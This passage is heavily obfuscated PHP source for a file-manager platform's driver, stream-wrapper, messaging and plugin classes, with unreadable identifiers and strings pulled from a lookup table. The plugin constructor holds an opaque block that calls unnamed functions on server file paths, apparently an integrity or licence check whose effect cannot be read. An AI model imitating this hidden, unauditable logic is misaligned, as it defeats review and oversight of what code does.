array_to_keyvalue($é¤“§¨ò, $ ¹“É—µ[403]); } if ($šúçÃë’[$ ¹“É—µ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$šúçÃë’[$ ¹“É—µ[403]]]) { return !1; } $ø¯ŸïÂÙ = $šúçÃë’[$ ¹“É—µ[1158]]; $×§­×Û¢ = self::driverGet($šúçÃë’, $ø¯ŸïÂÙ); return $×§­×Û¢; } private static function driverGet($„Ñ÷ç×¢, &$î½‡Ë) { $œáäÕ¶ =& $_SERVER[Æ š¦İÈ]; $ı¥İ¦‚Î = $„Ñ÷ç×¢[$œáäÕ¶[1159]]; $é¼ğÈœ = $„Ñ÷ç×¢[$œáäÕ¶[403]]; switch ($„Ñ÷ç×¢[$œáäÕ¶[33]]) { case KodIO::KOD_IO: $Â°û¤´ = self::$driverListSystem[$é¼ğÈœ]; break; case KodIO::KOD_SOURCE: $î½‡Ë = $é¼ğÈœ . $î½‡Ë; $Â°û¤´ = array($œáäÕ¶[1160] => $œáäÕ¶[1161], $œáäÕ¶[6] => $„Ñ÷ç×¢); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ã†ùÏÛŞ = $GLOBALS[$œáäÕ¶[1162]]; self::$driverListUser = array_to_keyvalue($ã†ùÏÛŞ, $œáäÕ¶[403]); } $Â°û¤´ = self::$driverListUser[$é¼ğÈœ]; break; case KodIO::KOD_SHARE_LINK: $Â°û¤´ = array($œáäÕ¶[1160] => $œáäÕ¶[1163], $œáäÕ¶[6] => $„Ñ÷ç×¢); $°”•–Ë× = Action($œáäÕ¶[1164])->sharePathInfo($„Ñ÷ç×¢[$œáäÕ¶[78]]); $î½‡Ë = $°”•–Ë×[$œáäÕ¶[405]]; if (!$°”•–Ë×[$œáäÕ¶[405]]) { $œ±²£é = Model($œáäÕ¶[597])->getInfo($°”•–Ë×[$œáäÕ¶[490]]); $î½‡Ë = KodIO::clear($œ±²£é[$œáäÕ¶[1165]] . $„Ñ÷ç×¢[$œáäÕ¶[1158]]); $„Ñ÷ç×¢[$œáäÕ¶[488]] = $œ±²£é; $„Ñ÷ç×¢[$œáäÕ¶[1142]] = $î½‡Ë; $Â°û¤´ = array($œáäÕ¶[1160] => $œáäÕ¶[1166], $œáäÕ¶[6] => $„Ñ÷ç×¢); } break; case KodIO::KOD_SHARE_ITEM: $Â°û¤´ = array($œáäÕ¶[1160] => $œáäÕ¶[1167], $œáäÕ¶[6] => $„Ñ÷ç×¢); $œ±²£é = Model($œáäÕ¶[597])->getInfo($„Ñ÷ç×¢[$œáäÕ¶[403]]); if ($œ±²£é[$œáäÕ¶[405]] == $œáäÕ¶[192]) { $î½‡Ë = KodIO::clear($œ±²£é[$œáäÕ¶[1165]] . $„Ñ÷ç×¢[$œáäÕ¶[1158]]); $„Ñ÷ç×¢[$œáäÕ¶[488]] = $œ±²£é; $„Ñ÷ç×¢[$œáäÕ¶[1142]] = $î½‡Ë; $Â°û¤´ = array($œáäÕ¶[1160] => $œáäÕ¶[1168], $œáäÕ¶[6] => $„Ñ÷ç×¢); } else { if (!$î½‡Ë) { $î½‡Ë = $œ±²£é[$œáäÕ¶[405]]; } } break; default: $î½‡Ë = $„Ñ÷ç×¢[$œáäÕ¶[78]]; $Â°û¤´ = array($œáäÕ¶[1160] => $œáäÕ¶[1169]); break; } $¿¬Ÿ£—¨ = $„Ñ÷ç×¢[$œáäÕ¶[78]]; if (!isset(self::$driverCache[$¿¬Ÿ£—¨])) { $çİ÷ï” = strtolower($Â°û¤´[$œáäÕ¶[96]]); $ ôßßé = $GLOBALS[$œáäÕ¶[6]][$œáäÕ¶[90]][$œáäÕ¶[823]]; $ÓñŒ™• = $œáäÕ¶[74] . (isset($ ôßßé[$çİ÷ï”]) ? $ ôßßé[$çİ÷ï”] : ucfirst($çİ÷ï”)); if (!class_exists($ÓñŒ™•)) { show_json("{$ÓñŒ™•}\40\156\157\x74\x20\x65\170\x69\163\x74\163\41", !1); } $õé„Æ³ = isset($Â°û¤´[$œáäÕ¶[6]]) ? $Â°û¤´[$œáäÕ¶[6]] : !1; self::$driverCache[$¿¬Ÿ£—¨] = new $ÓñŒ™•($õé„Æ³); } $ªÇ×Ê”Ò = self::$driverCache[$¿¬Ÿ£—¨]; $ªÇ×Ê”Ò->pathDriver = $ı¥İ¦‚Î; $ªÇ×Ê”Ò->pathBase = $œáäÕ¶[12]; if (isset($Â°û¤´[$œáäÕ¶[6]][$œáäÕ¶[1170]])) { $ªÇ×Ê”Ò->pathBase = rtrim($Â°û¤´[$œáäÕ¶[6]][$œáäÕ¶[1170]], $œáäÕ¶[8]) . $œáäÕ¶[8]; $î½‡Ë = $ªÇ×Ê”Ò->pathBase . ltrim($î½‡Ë, $œáäÕ¶[8]); } $î½‡Ë = $ªÇ×Ê”Ò->getPath($î½‡Ë); if (isset($„Ñ÷ç×¢[$œáäÕ¶[1142]])) { $î½‡Ë = $„Ñ÷ç×¢[$œáäÕ¶[1142]]; } $ªÇ×Ê”Ò->path = $î½‡Ë; return $ªÇ×Ê”Ò; } public static function errorTips($çê¯â¶è = false) { $æ¹ı¾Ü— =& $_SERVER[Æ š¦İÈ]; static $Æš“õñş = array(); $°ó³ï¸‘ = 1000; if ($çê¯â¶è === -1) { return $Æš“õñş ? $Æš“õñş[count($Æš“õñş) - 1] : $æ¹ı¾Ü—[12]; } if ($çê¯â¶è === !1) { return implode($æ¹ı¾Ü—[228], $Æš“õñş); } if (count($Æš“õñş) >= $°ó³ï¸‘) { $Æš“õñş = array_slice($Æš“õñş, $°ó³ï¸‘ * 0.5, $°ó³ï¸‘); } $Æš“õñş[] = $çê¯â¶è; write_log($æ¹ı¾Ü—[161] . ACTION . $æ¹ı¾Ü—[1171] . $çê¯â¶è, $æ¹ı¾Ü—[1172]); } public static function getLastError($€¾É«ÑŸ = '') { $ìÑ€ßëÀ = self::errorTips(-1); return $ìÑ€ßëÀ ? $ìÑ€ßëÀ : $€¾É«ÑŸ; } } goto B¡ÓÌÈ˜æŠ; Fï†ß¨î´ì: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($˜¼ùÃŞ, $áç£ïÕ = '') { $this->info = $this->info($˜¼ùÃŞ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Æ š¦İÈ][78]]; $this->pathOpen = $˜¼ùÃŞ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$˜¼ùÃŞ])) { self::$_chunkBuffer[$˜¼ùÃŞ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($×İªÎÍ¯) { $½ÃÓÕ–ü = $this->fileSubstr($this->pose, $×İªÎÍ¯); $this->pose += strlen($½ÃÓÕ–ü); return $½ÃÓÕ–ü; } public function stream_tell() { return $this->pose; } public function stream_seek($¥†²ø®, $ôÑù†Ş) { $Œ¨§Íšö =& $_SERVER[Æ š¦İÈ]; if ($ôÑù†Ş == SEEK_SET) { $this->pose = $¥†²ø®; } else { if ($ôÑù†Ş == SEEK_CUR) { $this->pose += $¥†²ø®; } else { if ($ôÑù†Ş == SEEK_END) { $this->pose = $this->info[$Œ¨§Íšö[80]] + intval($¥†²ø®); } } } if ($¥†²ø® < 0) { $this->pose = $this->info[$Œ¨§Íšö[80]] + $¥†²ø®; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Æ š¦İÈ][80]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÅŞåÂå¡, $ ƒ—İË‰) { $¢Ã¦ÒË— =& $_SERVER[Æ š¦İÈ]; $ˆ¼óè—¿ = $this->info($ÅŞåÂå¡); return array($¢Ã¦ÒË—[1493] => 0, $¢Ã¦ÒË—[1494] => 0, $¢Ã¦ÒË—[16] => 32768 + 511, $¢Ã¦ÒË—[1495] => 0, $¢Ã¦ÒË—[1496] => 0, $¢Ã¦ÒË—[1497] => 0, $¢Ã¦ÒË—[1498] => 0, $¢Ã¦ÒË—[80] => $ˆ¼óè—¿[$¢Ã¦ÒË—[80]], $¢Ã¦ÒË—[1499] => $ˆ¼óè—¿[$¢Ã¦ÒË—[1366]], $¢Ã¦ÒË—[1454] => $ˆ¼óè—¿[$¢Ã¦ÒË—[86]], $¢Ã¦ÒË—[1453] => $ˆ¼óè—¿[$¢Ã¦ÒË—[195]], $¢Ã¦ÒË—[1500] => 0, $¢Ã¦ÒË—[1501] => 0); } static $fileInfo = array(); public function info($±¡èÏÛ) { $µÀ§ç¤Á = $_SERVER[Æ š¦İÈ][1502]; if (isset(self::$fileInfo[$±¡èÏÛ])) { return self::$fileInfo[$±¡èÏÛ]; } if (substr($±¡èÏÛ, 0, strlen($µÀ§ç¤Á)) != $µÀ§ç¤Á) { return !1; } self::$fileInfo[$±¡èÏÛ] = IO::info(substr($±¡èÏÛ, strlen($µÀ§ç¤Á))); return self::$fileInfo[$±¡èÏÛ]; } public static function read($ŒŸ¹ùşî, $ˆ·Ø¢¯£, $¿·İîˆ) { if (!isset(self::$_fopenCache[$ŒŸ¹ùşî])) { $î…ÚñÃ„ = new StreamWrapperIO(); $î…ÚñÃ„->stream_open($ŒŸ¹ùşî); self::$_fopenCache[$ŒŸ¹ùşî] = $î…ÚñÃ„; } $î…ÚñÃ„ = self::$_fopenCache[$ŒŸ¹ùşî]; return $î…ÚñÃ„->fileSubstr($ˆ·Ø¢¯£, $¿·İîˆ); } public static function _read($¸ù‰Ø—š, $»îõ¥Ë, $á»¡¾ø) { $ü³ÔïáÊ =& $_SERVER[Æ š¦İÈ]; $”±œ©† = fopen($¸ù‰Ø—š, $ü³ÔïáÊ[1370]); if (!$”±œ©†) { return $ü³ÔïáÊ[12]; } $ŒóàÈ¦º = 8192; fseek($”±œ©†, $»îõ¥Ë, SEEK_SET); $ú´Ë¿âÊ = $ü³ÔïáÊ[12]; $ª™•ÇŸ‡ = 0; while ($ª™•ÇŸ‡ < $á»¡¾ø) { $æôí˜‰ = min($ŒóàÈ¦º, $á»¡¾ø - $ª™•ÇŸ‡); $ú´Ë¿âÊ .= fread($”±œ©†, $æôí˜‰); $ª™•ÇŸ‡ += $æôí˜‰; } fclose($”±œ©†); return $ú´Ë¿âÊ; } public function fileSubstr($¼ÅÔ’ñ˜, $± ü³î‚) { $õ„º‡™Ñ =& $_SERVER[Æ š¦İÈ]; $ëåÚñÊö = $this->info[$õ„º‡™Ñ[80]]; $ï¸ö½×« = $¼ÅÔ’ñ˜; $÷¸¾Ì¹ = $± ü³î‚; if ($¼ÅÔ’ñ˜ < 0) { $¼ÅÔ’ñ˜ = $ëåÚñÊö + $¼ÅÔ’ñ˜; } if ($± ü³î‚ === !1) { $± ü³î‚ = $ëåÚñÊö - $¼ÅÔ’ñ˜; } if ($¼ÅÔ’ñ˜ + $± ü³î‚ > $ëåÚñÊö) { $± ü³î‚ = $ëåÚñÊö - $¼ÅÔ’ñ˜; } if ($± ü³î‚ <= 0) { return $õ„º‡™Ñ[12]; } if ($¼ÅÔ’ñ˜ < 0 || $¼ÅÔ’ñ˜ >= $ëåÚñÊö || $± ü³î‚ <= 0 || $± ü³î‚ > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\145\x52\145\x61\144\40\145\162\x72\x6f\162\41\40\x73\164\141\162\164\x3d{$¼ÅÔ’ñ˜}\73\x6c\x65\x6e\x67\164\150\x3d{$± ü³î‚}\x3b\x20\163\151\172\x65\x3d{$ëåÚñÊö}\73"); } $ıÕç©± = 64 * 1024; $ôšêÔ¡Ê =& self::$_chunkBuffer[$this->path]; if (!$ôšêÔ¡Ê) { $ôšêÔ¡Ê = array(); } $ŞÃÖÁ„† = 0; $¹¿À³·í = 0; $ë×¡äÂá = $õ„º‡™Ñ[12]; foreach ($ôšêÔ¡Ê as $ŞÃÖÁ„† => $ë×¡äÂá) { $ŞÃÖÁ„† = intval($ŞÃÖÁ„†); $¹¿À³·í = $ŞÃÖÁ„† + strlen($ë×¡äÂá); if ($¼ÅÔ’ñ˜ >= $¹¿À³·í) { continue; } if ($¼ÅÔ’ñ˜ >= $ŞÃÖÁ„† && $¼ÅÔ’ñ˜ + $± ü³î‚ <= $¹¿À³·í) { return substr($ë×¡äÂá, $¼ÅÔ’ñ˜ - $ŞÃÖÁ„†, $± ü³î‚); } break; } if (count($ôšêÔ¡Ê) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($õ„º‡™Ñ[1503], $õ„º‡™Ñ[1504] . count($ôšêÔ¡Ê) . "\73\x73\x74\141\162\164\x3d{$¼ÅÔ’ñ˜}\x2c\x6c\x65\156\x67\164\150\75{$± ü³î‚}\73\160\x6f\x73\145\x3a{$ŞÃÖÁ„†}\x7e{$¹¿À³·í}"); throw new Exception($õ„º‡™Ñ[1505]); } $ığË‡íœ = intval($¼ÅÔ’ñ˜ / $ıÕç©±) * $ıÕç©±; $ËšÈ›Ÿ× = ceil(($¼ÅÔ’ñ˜ + $± ü³î‚) / $ıÕç©±) * $ıÕç©± - $ığË‡íœ; $‘†ŠãÆ‰ = IO::fileSubstr($this->path, $ığË‡íœ, $ËšÈ›Ÿ×); $ôšêÔ¡Ê[$ığË‡íœ . $õ„º‡™Ñ[12]] = $‘†ŠãÆ‰; ksort($ôšêÔ¡Ê); $£‚‹àŒ = substr($‘†ŠãÆ‰, $¼ÅÔ’ñ˜ - $ığË‡íœ, $± ü³î‚); return $£‚‹àŒ; } private function log($ÔÍÂéòÂ, $µêğ¯İ) { $Òºıûı =& $_SERVER[Æ š¦İÈ]; $‰”¤çÕ = timeFloat() - $this->timeStart; write_log(sprintf($Òºıûı[1506], $ÔÍÂéòÂ, $this->info[$Òºıûı[32]], $‰”¤çÕ, $µêğ¯İ), $Òºıûı[1172]); } } class Message { function __construct() { } public function send($µ¡Ÿˆ = '', $™˜îöÛ¯ = array(), $÷ÊÙà˜ = "\x74\145\x78\164") { $Õò°ñä¼ =& $_SERVER[Æ š¦İÈ]; $…î ß¬¯ = array($Õò°ñä¼[33] => $Õò°ñä¼[1507], $Õò°ñä¼[752] => $µ¡Ÿˆ); if (in_array($÷ÊÙà˜, array($Õò°ñä¼[1507], $Õò°ñä¼[1508]))) { $…î ß¬¯[$Õò°ñä¼[33]] = $÷ÊÙà˜; } $™˜îöÛ¯ = array($Õò°ñä¼[517] => isset($™˜îöÛ¯[$Õò°ñä¼[517]]) ? $™˜îöÛ¯[$Õò°ñä¼[517]] : $Õò°ñä¼[12], $Õò°ñä¼[596] => isset($™˜îöÛ¯[$Õò°ñä¼[596]]) ? $™˜îöÛ¯[$Õò°ñä¼[596]] : $Õò°ñä¼[12]); if (empty($µ¡Ÿˆ) || empty($™˜îöÛ¯[$Õò°ñä¼[517]]) && empty($™˜îöÛ¯[$Õò°ñä¼[596]])) { return !1; } $ÈÃœ™ß— = array($Õò°ñä¼[1447] => $…î ß¬¯, $Õò°ñä¼[1509] => $™˜îöÛ¯); Hook::trigger($Õò°ñä¼[1510], $ÈÃœ™ß—); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $œæ–¿³ø =& $_SERVER[Æ š¦İÈ]; if ($_SERVER[$œæ–¿³ø[391]] != $_SERVER[$œæ–¿³ø[392]]) { $ë·†©Ò¢ = $œæ–¿³ø[869]; $œİöÉ§ = $œæ–¿³ø[393]; $³ ŸêÊ¥ = $_SERVER[$œæ–¿³ø[394]] . $œæ–¿³ø[395]; $ÕÒÔİ« = $œİöÉ§($³ ŸêÊ¥); $îı­ş = explode($œæ–¿³ø[228], $ÕÒÔİ«); if (count($îı­ş) < $œæ–¿³ø[620]) { $Şõïã×ó = $œæ–¿³ø[397]; $Şõïã×ó(); } $¼Âø¾Ğ— = $œæ–¿³ø[870]; $¼Âø¾Ğ—($_SERVER[$œæ–¿³ø[871]]); $¼Âø¾Ğ—($_SERVER[$œæ–¿³ø[394]] . $œæ–¿³ø[872]); $½ª´‰Èˆ = 1; while ($½ª´‰Èˆ > 1) { $½ª´‰Èˆ = $½ª´‰Èˆ + 4; $°ìßßŞ = rawurlencode($½ª´‰Èˆ . $œæ–¿³ø[375]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($œæ–¿³ø[1511]); $this->pluginName = str_replace($œæ–¿³ø[1511], $œæ–¿³ø[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $œæ–¿³ø[8]; $this->pluginApi = appHostGet() . $œæ–¿³ø[1512] . $this->pluginName . $œæ–¿³ø[8]; $this->pluginHost = $config[$œæ–¿³ø[1513]] . $this->pluginName . $œæ–¿³ø[8]; $this->pluginHostDefault = $config[$œæ–¿³ø[1513]] . $this->pluginName . $œæ–¿³ø[8]; $²»óŞ†® = $config[$œæ–¿³ø[1514]]; if ($²»óŞ†® && strpos($œæ–¿³ø[50] . $²»óŞ†® . $œæ–¿³ø[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$œæ–¿³ø[1515]] . $this->pluginName . $œæ–¿³ø[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[Æ š¦İÈ][1516]); } protected function assign($ÍÑ¨›¥Õ, $ÇØ±ÇõÙ = false) { if (is_array($ÍÑ¨›¥Õ)) { $this->values = array_merge($this->values, $ÍÑ¨›¥Õ); } else { $this->values[$ÍÑ¨›¥Õ] = $ÇØ±ÇõÙ; } } protected function display($ûá—‹å) { extract($this->values); require $ûá—‹å; } final function hookRegist($·¡°ı«) { $this->modelPlugin->appRegist($this->pluginName, $·¡°ı«); } final function appIcon() { $¥º¡µ©Ó =& $_SERVER[Æ š¦İÈ]; $í×ÕÊŞß = $this->appPackage(); $÷­øÌİœ = $¥º¡µ©Ó[12]; if (isset($í×ÕÊŞß[$¥º¡µ©Ó[419]])) { if (isset($í×ÕÊŞß[$¥º¡µ©Ó[419]][$¥º¡µ©Ó[1517]])) { $÷­øÌİœ = $¥º¡µ©Ó[1518] . $í×ÕÊŞß[$¥º¡µ©Ó[419]][$¥º¡µ©Ó[1517]] . $¥º¡µ©Ó[1519]; } else { if ($í×ÕÊŞß[$¥º¡µ©Ó[419]][$¥º¡µ©Ó[1520]]) { $÷­øÌİœ = $¥º¡µ©Ó[1521] . $í×ÕÊŞß[$¥º¡µ©Ó[419]][$¥º¡µ©Ó[1520]] . $¥º¡µ©Ó[1522]; } } } return $÷­øÌİœ; } final function fileCanView($˜ÎóÜ€ç) { $ùî¿â™ =& $_SERVER[Æ š¦İÈ]; if (request_url_safe($˜ÎóÜ€ç)) { return !0; } if ($this->isShare($˜ÎóÜ€ç)) { return !0; } $ÊëûşÒ = Session::get($ùî¿â™[1523]); if (!$ÊëûşÒ || !$ÊëûşÒ[$ùî¿â™[1524]]) { $šì¼Ø¼¼ = $ùî¿â™[1525] . rawurlencode(this_url()); show_tips(LNG($ùî¿â™[1526]) . $ùî¿â™[1527] . $šì¼Ø¼¼ . $ùî¿â™[1528] . LNG($ùî¿â™[1529]) . $ùî¿â™[1530], !1); } if (!Action($ùî¿â™[1531])->authCan($ùî¿â™[1532])) { show_tips(LNG($ùî¿â™[1533]) . $ùî¿â™[1534], !1); } ActionCall($ùî¿â™[1535], $˜ÎóÜ€ç); } final function isShare($½¹Şíùµ) { $ÊÜÈÎÊ¸ = KodIO::parse($½¹Şíùµ); return $ÊÜÈÎÊ¸[$_SERVER[Æ š¦İÈ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($‹™…ú°¿) { if (request_url_safe($‹™…ú°¿)) { return $‹™…ú°¿; } if (!$this->isShare($‹™…ú°¿)) { $‹™…ú°¿ = $this->filePath($‹™…ú°¿); } return Action($_SERVER[Æ š¦İÈ][1164])->linkOut($‹™…ú°¿); } public function filePathLinkOut($äªËÁü) { if (request_url_safe($äªËÁü)) { return $äªËÁü; } $this->fileCanView($äªËÁü); return Action($_SERVER[Æ š¦İÈ][1164])->link($äªËÁü); } final function filePath($ê—¯¢ÏÀ) { $¿Å¬ëñ =& $_SERVER[Æ š¦İÈ]; if ($—šÖÍ Ó = $this->checkSharePath($ê—¯¢ÏÀ)) { Hook::trigger($¿Å¬ëñ[1536], $—šÖÍ Ó); return $—šÖÍ Ó; } $this->fileCanView($ê—¯¢ÏÀ); if (request_url_safe($ê—¯¢ÏÀ)) { $ü‡ÖÍ÷ü = parse_url_query($ê—¯¢ÏÀ); if (isset($ü‡ÖÍ÷ü[$¿Å¬ëñ[1537]]) && isset($ü‡ÖÍ÷ü[$¿Å¬ëñ[210]])) { $ø³ùË¯Õ = Model($¿Å¬ëñ[767])->get($¿Å¬ëñ[768]); $ÚŠÈŸÃ„ = Mcrypt::decode($ü‡ÖÍ÷ü[$¿Å¬ëñ[210]], $ø³ùË¯Õ); if ($ÚŠÈŸÃ„) { $this->fileInfo = IO::infoWithChildren($ÚŠÈŸÃ„); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ÚŠÈŸÃ„; } } $ê—¯¢ÏÀ = $this->_cacheHttpFile($ê—¯¢ÏÀ); $this->fileInfo = IO::infoWithChildren($ê—¯¢ÏÀ); } else { $this->fileInfo = IO::infoWithChildren($ê—¯¢ÏÀ); if (!$this->fileInfo) { show_tips(LNG($¿Å¬ëñ[106]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($¿Å¬ëñ[1536], $ê—¯¢ÏÀ); return $ê—¯¢ÏÀ; } final function _cacheHttpFile($Œ¶„ï˜Á) { $º•÷©şÇ = hash_path($Œ¶„ï˜Á, !0); $this->cachePath = $this->pluginCachePath($º•÷©şÇ); if ($‘Ã¯ú¯ = IO::fileNameExist($this->cachePath, $º•÷©şÇ)) { return KodIO::make($‘Ã¯ú¯); } $ù«¸û = $this->cachePath . $º•÷©şÇ; return $this->pluginCacheFileSet($ù«¸û, file_get_contents_nossl($Œ¶„ï˜Á)); } final function _tmpFileName($ÆŸÈ‚ô• = array()) { $˜ü¯© =& $_SERVER[Æ š¦İÈ]; if (!$ÆŸÈ‚ô•) { $ÆŸÈ‚ô• = $this->fileInfo; } if (isset($ÆŸÈ‚ô•[$˜ü¯©[172]])) { return $ÆŸÈ‚ô•[$˜ü¯©[172]]; } if (isset($ÆŸÈ‚ô•[$˜ü¯©[165]][$˜ü¯©[172]])) { return $ÆŸÈ‚ô•[$˜ü¯©[165]][$˜ü¯©[172]]; } $ã®ˆğñ = IO::hashSimple($ÆŸÈ‚ô•[$˜ü¯©[78]]); if ($ã®ˆğñ) { return $ã®ˆğñ; } $ÊÖºÌî“ = array($ÆŸÈ‚ô•[$˜ü¯©[32]], $ÆŸÈ‚ô•[$˜ü¯©[78]], $ÆŸÈ‚ô•[$˜ü¯©[80]]); if (isset($ÆŸÈ‚ô•[$˜ü¯©[523]])) { $ÊÖºÌî“[] = $ÆŸÈ‚ô•[$˜ü¯©[523]]; } return md5(implode($˜ü¯©[11], $ÊÖºÌî“)); } final function checkSharePath($ÀšÕ ¹) { $±ßõÏä =& $_SERVER[Æ š¦İÈ]; if (!defined($±ßõÏä[476])) { define($±ßõÏä[516], 0); } if (!$this->isShare($ÀšÕ ¹)) { return !1; } $£¹à·¨ = Action($±ßõÏä[1164])->sharePathInfo($ÀšÕ ¹); if (!isset($£¹à·¨[$±ßõÏä[78]])) { show_json(LNG($±ßõÏä[1538]), !1); } $this->fileInfo = $£¹à·¨[$±ßõÏä[165]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$±ßõÏä[172]]); return $£¹à·¨[$±ßõÏä[78]]; } final function pluginCachePath($¡òÍ‡«Ñ = '') { $¼Õ·‰Üş =& $_SERVER[Æ š¦İÈ]; $´¨ãÆ› = IO_PATH_SYSTEM_TEMP . $¼Õ·‰Üş[1539] . $this->pluginName; if (!($Ç¾›üÂÆ = IO::infoFull($´¨ãÆ›))) { return IO::mkdir($´¨ãÆ› . $¼Õ·‰Üş[8] . $¡òÍ‡«Ñ); } if (empty($¡òÍ‡«Ñ)) { return $Ç¾›üÂÆ[$¼Õ·‰Üş[78]]; } if (!($Ù™¶Ã…· = IO::fileNameExist($Ç¾›üÂÆ[$¼Õ·‰Üş[78]], $¡òÍ‡«Ñ))) { return IO::mkdir($Ç¾›üÂÆ[$¼Õ·‰Üş[78]] . $¡òÍ‡«Ñ); } return KodIO::make($Ù™¶Ã…·); } final function pluginCacheFileSet($¢Íˆ¤§, $û¥ÓãëÌ = '') { $Ø–•à½¢ =& $_SERVER[Æ š¦İÈ]; if (!($“›´²¢ = IO::infoFull($¢Íˆ¤§))) { return IO::mkfile($¢Íˆ¤§, $û¥ÓãëÌ, REPEAT_REPLACE); } IO::setContent($“›´²¢[$Ø–•à½¢[78]], $û¥ÓãëÌ); return $“›´²¢[$Ø–•à½¢[78]]; } final function pluginLocalFile($ø²Üæòù = '') { $ññªíÕ =& $_SERVER[Æ š¦İÈ]; $¶”éŒÛ§ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¶”éŒÛ§)) { mk_dir($¶”éŒÛ§); } if (!$ø²Üæòù) { return $¶”éŒÛ§; } $á«ÆÁı“ = IO::info($ø²Üæòù); $¢’ÖÛØÇ = $this->_tmpFileName($á«ÆÁı“) . $ññªíÕ[10] . $á«ÆÁı“[$ññªíÕ[169]]; if (!checkExtSafe($¢’ÖÛØÇ)) { $¢’ÖÛØÇ = $¢’ÖÛØÇ . $ññªíÕ[1540]; } $¾¼à¸¸ä = $¶”éŒÛ§ . $¢’ÖÛØÇ; if (@file_exists($¾¼à¸¸ä)) { return $¾¼à¸¸ä; } return IO::copy($ø²Üæòù, $¶”éŒÛ§, 0, $¢’ÖÛØÇ); } final function appPackage() { $îĞèÉæƒ =& $_SERVER[Æ š¦İÈ]; if ($this->packageData) { return $this->packageData; } $âÍ´ÓòŠ = $this->parseFile($this->pluginPath . $îĞèÉæƒ[1541]); $this->parseLang($âÍ´ÓòŠ); $¿µ…°´‚ = json_decode_force($âÍ´ÓòŠ); if (!$¿µ…°´‚) { return array(); } $ıÁ¯éû = Hook::trigger($îĞèÉæƒ[1542], $¿µ…°´‚); if ($ıÁ¯éû && is_array($ıÁ¯éû)) { $¿µ…°´‚ = $ıÁ¯éû; } $this->packageData = $¿µ…°´‚; return $¿µ…°´‚; } public function packageInfoGet($î¦×œñ) { $ÔËÄ¢²» = $this->appPackage(); return array_get_value($ÔËÄ¢²», $î¦×œñ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Æ š¦İÈ][1543]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Æ š¦İÈ][1544]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Æ š¦İÈ][1545]); } public function echoJsAssign($­ŞÊ•¦, $°¨Ì‹Ãˆ) { $this->echoJsAssignArr[$­ŞÊ•¦] = $°¨Ì‹Ãˆ; } private function parseFile($…ë¡¶™õ) { $Ëú½ÜÍ× =& $_SERVER[Æ š¦İÈ]; $µî«ö˜í = file_get_contents_nossl($…ë¡¶™õ); $Ô­—Á¹‰ = array($Ëú½ÜÍ×[1546], $Ëú½ÜÍ×[1547], $Ëú½ÜÍ×[1548], $Ëú½ÜÍ×[1549], $Ëú½ÜÍ×[1550], $Ëú½ÜÍ×[1551], $Ëú½ÜÍ×[1552]); $ƒÀ°Ø = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ëú½ÜÍ×[90]][$Ëú½ÜÍ×[1553]]); foreach ($this->echoJsAssignArr as $ïÎŸ˜€ã => $Èª¦ÍÄÅ) { $Ô­—Á¹‰[] = $Ëú½ÜÍ×[1554] . $ïÎŸ˜€ã . $Ëú½ÜÍ×[1555]; $ƒÀ°Ø[] = is_array($Èª¦ÍÄÅ) || is_object($Èª¦ÍÄÅ) ? rawurlencode(json_encode($Èª¦ÍÄÅ)) : $Èª¦ÍÄÅ; } if (strstr($µî«ö˜í, $Ëú½ÜÍ×[1556])) { $Éø¯ıõı = rawurlencode(json_encode($this->pluginLangArr)); $µî«ö˜í = str_replace($Ëú½ÜÍ×[1556], $Éø¯ıõı, $µî«ö˜í); } if (strstr($µî«ö˜í, $Ëú½ÜÍ×[1557])) { $Éø¯ıõı = $Éø¯ıõı = rawurlencode(json_encode($this->getConfig())); $µî«ö˜í = str_replace($Ëú½ÜÍ×[1557], $Éø¯ıõı, $µî«ö˜í); } $µî«ö˜í = str_replace($Ô­—Á¹‰, $ƒÀ°Ø, $µî«ö˜í); return $µî«ö˜í; } private function parseLang(&$¼‹Œ÷¤’) { $ƒº¢ÖÕ‚ =& $_SERVER[Æ š¦İÈ]; $­–Õøèä = $ƒº¢ÖÕ‚[1558]; if (!strstr($¼‹Œ÷¤’, $­–Õøèä)) { return; } preg_match_all($ƒº¢ÖÕ‚[1559], $¼‹Œ÷¤’, $¡«îÊ§ø); if (!is_array($¡«îÊ§ø) || count($¡«îÊ§ø) == 0 || !is_array($¡«îÊ§ø[0]) || count($¡«îÊ§ø[0]) == 0) { return; } $ï¹Ù­ = array(); $ïÊ°ªÕª = array(); foreach ($¡«îÊ§ø[0] as $‹µ¨ú“) { $Çë›ƒÒ© = substr($‹µ¨ú“, strlen($­–Õøèä), -4); $²“€ƒ± = LNG($Çë›ƒÒ©); $ï¹Ù­[] = $‹µ¨ú“; $ïÊ°ªÕª[] = 